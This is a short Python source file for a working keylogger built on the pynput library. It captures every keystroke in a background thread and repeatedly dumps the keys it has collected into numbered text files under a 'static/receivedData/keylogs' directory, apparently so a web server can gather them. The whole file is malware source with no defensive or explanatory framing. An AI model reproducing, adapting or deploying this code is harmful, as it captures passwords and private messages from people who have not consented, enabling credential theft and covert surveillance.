import os, threading
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.keyloggerNumber = 0

    def get_key_name(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char
        else:
            return str(key)

    def on_press(self, key):
        key_name = self.get_key_name(key)
        self.keys.append(key_name)
        self.count += 1
        if self.count >= 10:
            self.count = 0
            self.write_file()

    def write_file(self):
        filename = f"keylogs_{self.keyloggerNumber}.txt"
        filepath = os.path.join("./static/receivedData/keylogs/", filename)
        with open(filepath, 'w') as f:
            for key in self.keys:
                f.write(str(key) + ' ')
        tmp = f"/static/receivedData/keylogs/{filename}"
        self.keyloggerNumber += 1

    def start_keylogger(self):
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()

    def on_release(self, key):
        pass

def start_keylogger():
    keylogger_instance = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger_instance.start_keylogger)
    keylogger_thread.start()

if __name__ == "__main__":
    start_keylogger()
